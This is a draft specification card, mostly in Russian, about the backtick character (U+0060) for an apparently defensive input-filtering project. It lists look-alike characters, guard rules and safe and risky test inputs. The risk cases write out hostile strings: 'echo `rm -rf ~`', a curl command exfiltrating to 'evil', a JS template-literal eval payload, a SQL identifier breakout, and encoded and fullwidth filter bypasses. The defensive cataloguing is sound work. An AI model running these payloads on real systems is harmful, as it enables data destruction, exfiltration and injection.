PRIVATE AUTHORED PROJECT / COMMERCIAL USE PROHIBITED

DOCUMENT_ID: SIGN_CORE_CARD_GRAVE_ACCENT_U0060_GEN3_v0_3_RU
DOCUMENT_TYPE: SIGN_CORE_CARD
TEMPLATE_LINE: GEN3_v0_3
DOCUMENT_STATUS: WORKING_DRAFT
STATUS: WORKING_DRAFT / NOT_LOCKED / NOT_RUNTIME / NOT_VALIDATOR / NOT_PRODUCTION / NOT_CONVEYOR_RUN
SOURCE_TEMPLATE: SIGN_CORE_CARD_TEMPLATE_GEN3_v0_3_EN
BASED_ON_RULESET: SIGN_CORE_CARD_CONVEYOR_RULES_GEN3_v0_3_EN
TRANSLATION_NOTE: Русский оригинал (authoritative). Английское зеркало — SIGN_CORE_CARD_GRAVE_ACCENT_U0060_GEN3_v0_3_EN. Кодпоинты, имена полей и формулы идентичны. ЧЕРНОВИК для нашей работы (Vakhter); конвейер — отдельный проект.

============================================================
0. UNIVERSALITY
============================================================
BOUND_TO_SPECIFIC_SIGN: YES
AFTER_USE_RESIDUE: FORBIDDEN
SIGN_DATA_IS_SESSION_ONLY: YES

============================================================
1. COMMON_CONVEYOR_DISCIPLINE
============================================================
CONVEYOR_DISCIPLINE_VERSION: v0_3
RUN_CARD_REQUIRED_BEFORE_LOCK: YES
LOCKED_WORKING_CORE_SELF_ASSIGNMENT: FORBIDDEN
MODEL_FAMILY_DIVERSITY_REQUIRED: YES
ADVERSARIAL_EVIDENCE_REQUIRED: YES
MUTATION_CHECK_REQUIRED: YES
LIMITATION_STATEMENT_REQUIRED: YES
AFTER_RUN_RESIDUE: FORBIDDEN
STATUS_PROGRESSION_TRACKER:
  WORKING_DRAFT: YES
  STRUCTURAL_PREFLIGHT_PASS: PENDING
  CONVEYOR_REVIEW_PASS: PENDING
  WORKINGLY_CLOSED: PENDING
  SIMULATION_GATE_TIER: TIER_1
  SIMULATION_GATE_PASSED: PENDING
  ARTIFACT_CONFIRMED: PENDING
LIMITATION_STATEMENT (standard):
  CONVEYOR_PASS ≠ VALIDATION
  MODEL_CONSENSUS ≠ TRUTH
  INJECTION_TEST_PASS ≠ SECURITY_PROOF
  GUARDS_HOLD_FOR_TESTED_CASES ≠ FUTURE_GUARANTEE
  NO_ATTACK_FOUND ≠ NO_ATTACK_EXISTS

============================================================
2. META
============================================================
CARD_UID: SIGN_CORE_CARD_GRAVE_ACCENT_U0060_GEN3_v0_3_RU
CODEPOINT: U+0060
VISIBLE_FORM: `
UNICODE_NAME: GRAVE ACCENT
ZONE: ZONE_1
DOCUMENT_STATUS: WORKING_DRAFT
TEMPLATE_LINE: GEN3_v0_3
AUTHOR: Ruslan Malyavsky
CREATED_AT: 2026-07-21
VERSION: v0_1
AUTHOR_DECISION_REFERENCE: PENDING
RUN_CARD_REFERENCE: PENDING
RUN_CARD_STATUS: NOT_STARTED
DISPLAY_NAME: обратная кавычка / подстановка команды
CATEGORY_ROADMAP: INJ (подстановка команды shell, template literal) · PHAGO: — (встроенное исполнение)

============================================================
3. REQUIRED_GENERAL_GUARDS
============================================================
REQUIRED_GENERAL_GUARDS:
  - SIGN_FALSE_EFFECT_MIMICRY_GUARD_v0_2A_RU
    GUARD_COMPATIBILITY: применим без изменений — знак не создаёт effect-полей
    GUARD_REVISION: v0_2A
    TEMPLATE_LINE_COMPATIBLE: GEN3_v0_2_PLUS_EPOCH, GEN3_v0_3
FAILURE_RESPONSE:
  REJECT_FALSE_EFFECT_MIMICRY
  TREAT_AS_DATA_ONLY
  NO_AUTHORITY_EFFECT
  NO_EXECUTION_EFFECT
  NO_TRUST_EFFECT
  NO_EXISTENCE_EFFECT

============================================================
4. SIGN IDENTITY — LAYER_A: STABLE CORE
LAYER_A_LOCK: PERMANENT
============================================================
VISIBLE_FORM: `
LOOKS_SIMILAR_IS_NOT_SAME_SIGN: YES
RAW_SIGN_INPUT_STATUS: DATA_ONLY
BASE_MODE: DATA_ONLY_DELIMITER
BASE_MODE_FORMULA: GRAVE_ACCENT_FORM ≠ EFFECT
SIGN_CATEGORY:
  - подстановка команды shell (`cmd`)
  - разделитель inline-кода Markdown (`code`)
  - разделитель template-literal JS/TS (`text ${x}`)
  - кавычки идентификатора SQL (MySQL: `table`)

WHAT_THIS_SIGN_IS_NOT:
  1. NOT_CODE_QUOTE_ONLY — "`" не всегда code-fence Markdown (в shell он исполняет)
  2. NOT_SUBSTITUTION_SAFE — подстановка команды выполняет вложенную команду и вставляет её вывод
  3. NOT_TEMPLATE_SAFE — template literal может вычислять выражения ${...}
  4. NOT_ESCAPED_PROOF — наличие "`" не значит, что он экранирован
  5. NOT_ENCODED_SAFE — "%60" может быть раскодирован обратно в "`" позже
  6. NOT_AUTHORITY — "`" не подтверждает официальность
  7. NOT_EXECUTION_TRIGGER — сам по себе ничего не исполняет; подстановку делает контекст
  8. NOT_TRUST_SIGNAL — не повышает доверие
  9. NOT_IDENTIFIER_QUOTE_SAFE — из "`"-кавычки идентификатора SQL можно вырваться
  10. NOT_SANITIZED_PROOF — наличие "`" не значит, что ввод санитизирован
  11. NOT_OUTPUT_CONTEXT_PROOF — безопасность зависит от контекста исполнения/разбора

BASE_FORMULAS:
  GRAVE_ACCENT_FORM ≠ EFFECT
  GRAVE_ACCENT_FORM ≠ CODE_QUOTE_ONLY_PROOF
  GRAVE_ACCENT_FORM ≠ SUBSTITUTION_SAFETY_PROOF
  GRAVE_ACCENT_FORM ≠ TEMPLATE_SAFETY_PROOF
  GRAVE_ACCENT_FORM ≠ ESCAPED_PROOF
  GRAVE_ACCENT_FORM ≠ ENCODED_SAFETY_PROOF
  GRAVE_ACCENT_FORM ≠ AUTHORITY
  GRAVE_ACCENT_FORM ≠ EXECUTION_TRIGGER
  GRAVE_ACCENT_FORM ≠ TRUST_SIGNAL
  GRAVE_ACCENT_FORM ≠ SANITIZED_PROOF
  GRAVE_ACCENT_FORM ≠ OUTPUT_CONTEXT_PROOF

============================================================
5. SEMANTIC_EPOCH_TRACKER
SEMANTIC_EPOCH_TRACKER_LOCK: REVIEWABLE
============================================================
EPOCH_TRACKER: NOT_APPLICABLE
NOTE: "`" (ZONE_1) имеет параллельные функции (знак ударения, подстановка shell, код Markdown, template literal, кавычка SQL), сосуществующие без культурной прецессии. Полисемия стабильного знака.
LAYER_ANOMALY:
  ABSENT_PHYSICAL_LAYER: YES, уровень L1
  NOTE: диакритический знак, переосмысленный как ASCII-байт; функции подстановки/кода/шаблона надстроены цифровой эпохой параллельно.

============================================================
6. EFFECT_FIELDS — LAYER_C: METHODOLOGICAL LAYER
LAYER_C_LOCK: SESSION
============================================================
authority_effect: NONE
trust_effect: NONE
verification_effect: NONE
proof_effect: NONE
execution_effect: NONE
permission_effect: NONE
status_effect: NONE
role_assignment_effect: NONE
runtime_effect: NONE
existence_effect: NONE
EFFECT_FIELDS_ALL_NONE: YES
CLOSED_SCHEMA: YES

============================================================
7. SAFE / RISK / CONFUSABLES / GUARDS — LAYER_B
LAYER_B_LOCK: REVIEWABLE
============================================================
SAFE_CASES:
  SAFE_CASE_001:
    INPUT: "use `code` for inline"
    CONTEXT: разделитель inline-кода Markdown
    EXPECTED: INFO
    RISK: NONE
    GUARD: GRAVE_ACCENT_FORM ≠ CODE_QUOTE_ONLY_PROOF
  SAFE_CASE_002:
    INPUT: "voilà"
    CONTEXT: диакритика грависа (à), показанная как текст
    EXPECTED: INFO
    RISK: NONE
    GUARD: GRAVE_ACCENT_FORM ≠ EFFECT
  SAFE_CASE_003:
    INPUT: "```\\nblock\\n```"
    CONTEXT: fenced code block Markdown
    EXPECTED: INFO
    RISK: NONE
    GUARD: GRAVE_ACCENT_FORM ≠ CODE_QUOTE_ONLY_PROOF
  SAFE_CASE_004:
    INPUT: "SELECT `email` FROM t"
    CONTEXT: кавычка идентификатора SQL (как литеральный текст)
    EXPECTED: INFO
    RISK: NONE
    GUARD: GRAVE_ACCENT_FORM ≠ EFFECT
  SAFE_CASE_005:
    INPUT: "`hello world`"
    CONTEXT: обычная закавыченная фраза в документации
    EXPECTED: INFO
    RISK: NONE
    GUARD: GRAVE_ACCENT_FORM ≠ EFFECT
  SAFE_CASE_006:
    INPUT: "press the ` key"
    CONTEXT: название физической клавиши backtick в тексте
    EXPECTED: INFO
    RISK: NONE
    GUARD: GRAVE_ACCENT_FORM ≠ CODE_QUOTE_ONLY_PROOF

RISK_CASES:
  RISK_CASE_001:
    NAME: SHELL_COMMAND_SUBSTITUTION
    INPUT: "echo `rm -rf ~`"
    CONTEXT: подстановка команды, исполняющая вложенную команду
    RISK: CRITICAL
    ATTACK: shell выполняет команду внутри обратных кавычек и вставляет её вывод
    GUARD: GRAVE_ACCENT_FORM ≠ SUBSTITUTION_SAFETY_PROOF
  RISK_CASE_002:
    NAME: NESTED_SUBSTITUTION_EXFIL
    INPUT: "`curl evil/$(whoami)`"
    CONTEXT: подстановка в сочетании с эксфильтрацией данных
    RISK: CRITICAL
    ATTACK: команда в обратных кавычках выполняется и утекает результат на хост атакующего
    GUARD: GRAVE_ACCENT_FORM ≠ EFFECT
  RISK_CASE_003:
    NAME: TEMPLATE_LITERAL_EVAL
    INPUT: "`${constructor.constructor('alert(1)')()}`"
    CONTEXT: template literal JS, вычисляющий внедрённое выражение
    RISK: HIGH
    ATTACK: ${...} внутри backtick-шаблона вычисляет код атакующего
    GUARD: GRAVE_ACCENT_FORM ≠ TEMPLATE_SAFETY_PROOF
  RISK_CASE_004:
    NAME: SQL_IDENTIFIER_BREAKOUT
    INPUT: "col` FROM users; -- "
    CONTEXT: пробой backtick-кавычки идентификатора MySQL
    RISK: HIGH
    ATTACK: "`" закрывает кавычку идентификатора и позволяет выполнить внедрённое предложение
    GUARD: GRAVE_ACCENT_FORM ≠ IDENTIFIER_QUOTE_SAFE
  RISK_CASE_005:
    NAME: ENCODED_BACKTICK_BYPASS
    INPUT: "cmd%60whoami%60 (с поздним декодированием)"
    CONTEXT: кодированный "`" декодируется обратно перед исполнением
    RISK: HIGH
    ATTACK: %60 декодируется в "`" ПОСЛЕ проверки → подстановка команды
    GUARD: GRAVE_ACCENT_FORM ≠ ENCODED_SAFETY_PROOF
  RISK_CASE_006:
    NAME: FULLWIDTH_BACKTICK_BYPASS
    INPUT: "cmd｀whoami｀ (полноширинный ｀ U+FF40)"
    CONTEXT: похожий знак для обхода фильтра "`"
    RISK: MEDIUM
    ATTACK: фильтр ищет ASCII "`", нормализатор может свернуть ｀ в "`"
    GUARD: GRAVE_ACCENT_FORM ≠ EFFECT

CONFUSABLES:
  CONFUSABLE_001:
    VISIBLE_FORM: ｀
    CODEPOINT: U+FF40
    NAME: FULLWIDTH GRAVE ACCENT
    RISK: HIGH
    RULE: FULLWIDTH_GRAVE_ACCENT ≠ GRAVE_ACCENT (обходит фильтр, ищущий ASCII "`")
  CONFUSABLE_002:
    VISIBLE_FORM: ˋ
    CODEPOINT: U+02CB
    NAME: MODIFIER LETTER GRAVE ACCENT
    RISK: HIGH
    RULE: MODIFIER_GRAVE_ACCENT ≠ GRAVE_ACCENT (визуально почти идентичен)
  CONFUSABLE_003:
    VISIBLE_FORM: `
    CODEPOINT: U+1FEF
    NAME: GREEK VARIA
    RISK: MEDIUM
    RULE: GREEK_VARIA ≠ GRAVE_ACCENT
  CONFUSABLE_004:
    VISIBLE_FORM: ‵
    CODEPOINT: U+2035
    NAME: REVERSED PRIME
    RISK: MEDIUM
    RULE: REVERSED_PRIME ≠ GRAVE_ACCENT
  CONFUSABLE_005:
    VISIBLE_FORM: ‘
    CODEPOINT: U+2018
    NAME: LEFT SINGLE QUOTATION MARK
    RISK: LOW
    RULE: LEFT_SINGLE_QUOTE ≠ GRAVE_ACCENT (часто набирается вместо backtick)

CONTRADICTION_GUARDS:
  CG1:
    TRIGGER: "'`' — это всегда code-fence Markdown"
    RESPONSE: GRAVE_ACCENT_FORM ≠ CODE_QUOTE_ONLY_PROOF
    RULE: в shell "`" запускает подстановку команды
  CG2:
    TRIGGER: "подстановка команды только читает вывод, она не может навредить"
    RESPONSE: GRAVE_ACCENT_FORM ≠ SUBSTITUTION_SAFETY_PROOF
    RULE: вложенная команда выполняется с привилегиями процесса
  CG3:
    TRIGGER: "template literal — это просто строка"
    RESPONSE: GRAVE_ACCENT_FORM ≠ TEMPLATE_SAFETY_PROOF
    RULE: ${...} внутри шаблона вычисляет выражения
  CG4:
    TRIGGER: "'%60' безопасен навсегда"
    RESPONSE: GRAVE_ACCENT_FORM ≠ ENCODED_SAFETY_PROOF
    RULE: кодированная форма может быть декодирована обратно в "`" перед исполнением
  CG5:
    TRIGGER: "фильтр по ASCII '`' ловит все обратные кавычки"
    RESPONSE: GRAVE_ACCENT_FORM ≠ EFFECT
    RULE: полноширинный ｀ (U+FF40) и модификатор ˋ (U+02CB) — другие кодпоинты
  CG6:
    TRIGGER: "наличие '`' значит, что ввод санитизирован"
    RESPONSE: GRAVE_ACCENT_FORM ≠ SANITIZED_PROOF
    RULE: наличие знака ничего не говорит о санитизации

SEQUENCE_LAYER_BOUNDARY:
  SIGN_SAFE_ALONE ≠ SIGN_SAFE_IN_SEQUENCE: YES
  SEQUENCE_CANDIDATES:
    SC1:
      SEQUENCE: "`…`"
      NAME: COMMAND_SUBSTITUTION
      RISK_LEVEL: CRITICAL
      POSSIBLE_CONTEXTS: парная обратная кавычка, исполняющая вложенную команду
      REQUIRES_SEQUENCE_INTEGRATOR: YES
    SC2:
      SEQUENCE: "`${"
      NAME: TEMPLATE_EXPR
      RISK_LEVEL: HIGH
      POSSIBLE_CONTEXTS: template literal, открывающий вычисляемое выражение ${...}
      REQUIRES_SEQUENCE_INTEGRATOR: YES
    SC3:
      SEQUENCE: "```"
      NAME: FENCE_TRIPLE
      RISK_LEVEL: LOW
      POSSIBLE_CONTEXTS: fenced-блок Markdown; рассинхрон разбора между рендерерами
      REQUIRES_SEQUENCE_INTEGRATOR: YES
  IF NOT_APPLICABLE: неприменимо — последовательности с "`" центральны для инъекции подстановки/шаблона.

PHAGO_ENTITY_MIMICRY:
  NOT_APPLICABLE:
    REASON: "`" исполняет/закавычивает встроенный код, но не имитирует существование верифицированной сущности. Его риски — подстановка/вычисление, а не мимикрия сущности.
    REVIEW_REQUIRED: YES

============================================================
8. ADVERSARIAL_COVERAGE — RUN_CARD SEED
============================================================
MIN_TOTAL_VECTORS: 10 (5 категорий A-E, CATEGORY_F NOT_APPLICABLE для ZONE_1)
CATEGORY_A: FORM_MANIPULATION (2)
  A1: замена ASCII "`" на полноширинный ｀ (U+FF40) для обхода фильтра
  A2: замена на модификатор ˋ (U+02CB)
CATEGORY_B: CONTEXT_INJECTION (2)
  B1: подстановка команды shell echo `rm -rf ~`
  B2: пробой идентификатора SQL col` FROM users; --
CATEGORY_C: SEQUENCE_MANIPULATION (2)
  C1: "`…`" (SC1) — пара подстановки команды
  C2: "`${" (SC2) — открытие выражения шаблона
CATEGORY_D: SEMANTIC_MIMICRY (2)
  D1: "`" подан как безобидная code-кавычка Markdown внутри поля команды
  D2: "%60" как «безопасный» кодированный текст с поздним декодированием
CATEGORY_E: PHAGO_ENTITY_MIMICRY (2)
  E1: N/A — знак не PHAGO-носитель; вектор: подстановка в шаблон OS-команды
  E2: N/A — вектор: вычисление template literal в рендеримой JS-строке
CATEGORY_F: SEMANTIC_LAYER_MANIPULATION
  NOT_APPLICABLE
  REASON: ZONE_1, у знака нет спящих/активных эпох.
ACTUAL_TOTAL_VECTORS: 10
COVERAGE_STATUS: SUFFICIENT (10 ≥ 10)

============================================================
9. MUTATION_CHECK
============================================================
MUTATION_01:
  CLAIM: "`" — всегда code-fence Markdown
  EXPECTED: FAIL_CODE_QUOTE_ONLY_MIMICRY
  RESULT: FAIL
MUTATION_02:
  CLAIM: подстановка команды не может навредить
  EXPECTED: FAIL_SUBSTITUTION_SAFETY_MIMICRY
  RESULT: FAIL
MUTATION_03:
  CLAIM: template literal — это просто строка
  EXPECTED: FAIL_TEMPLATE_SAFETY_MIMICRY
  RESULT: FAIL
MUTATION_04:
  CLAIM: "%60" безопасен навсегда
  EXPECTED: FAIL_ENCODED_SAFETY_MIMICRY
  RESULT: FAIL
MUTATION_05:
  CLAIM: фильтр по ASCII "`" ловит все похожие обратные кавычки
  EXPECTED: FAIL_CONFUSABLE_COVERAGE_MIMICRY
  RESULT: FAIL
MUTATION_06:
  CLAIM: наличие "`" доказывает санитизацию ввода
  EXPECTED: FAIL_SANITIZED_MIMICRY
  RESULT: FAIL

============================================================
10. KNOWN_OPEN_QUESTIONS
============================================================
OQ1:
  QUESTION: как нейтрализовать "`" по контексту (shell/JS-template/MySQL) без ложных срабатываний на Markdown/диакритике/тексте?
  STATUS: CLOSED_AS_DELEGATED_TO_INTEGRATOR (exec через вектор аргументов + отказ от eval template literal недоверенного ввода + параметризованные запросы — забота интегратора/рантайма)
  BLOCKS_WORKINGLY_CLOSED: NO
  NOTE: карточка фиксирует правило «безопасность '`' решается контекстом исполнения/разбора».
ALL_OPEN_QUESTIONS_CLOSED: NO (делегировано, не блокирует)

============================================================
11. PATCH_HISTORY
============================================================
PATCH_HISTORY:
  v0_1_PATCH_01: первичное создание (Ruslan Malyavsky, 2026-07-21) — черновик по шаблону GEN3_v0_3 (Vakhter); не прогнан по конвейеру.
PATCHES_APPLIED: 1
PATCHES_VERIFIED: 0/1

============================================================
12. LIMITATION_STATEMENT
============================================================
LIMITATION_STATEMENT:
  THIS_CARD IS A WORKING_DRAFT ARTIFACT (until ARTIFACT_CONFIRMED)
  NOT A FINAL_STANDARD
  NOT A PARSER
  NOT A RUNTIME
  NOT A SECURITY_CERTIFICATE
  NOT_CONVEYOR_RUN (черновик для нашей работы; конвейер — отдельный проект)
  CONVEYOR_PASS ≠ VALIDATION
  RUN_CARD_RESULT ≠ FINAL_STATUS
  WORKINGLY_CLOSED ≠ ARTIFACT_CONFIRMED

============================================================
13. INTEGRATION_INTERFACE_STATUS
============================================================
INTEGRATION_INTERFACE_STATUS:
  STATUS: READY_PENDING_CONCRETE_INTEGRATOR
  ATTACHED_INTEGRATOR_UID: NONE_CURRENTLY_ATTACHED
  ACTIVE_MODULES_COUNT: 0
  RUNTIME_ATTACHMENT: NONE
  PERMANENT_BINDING: NO
  SESSION_ONLY_BINDING: YES
  AFTER_RUN_RESIDUE: FORBIDDEN

============================================================
END_OF_DOCUMENT
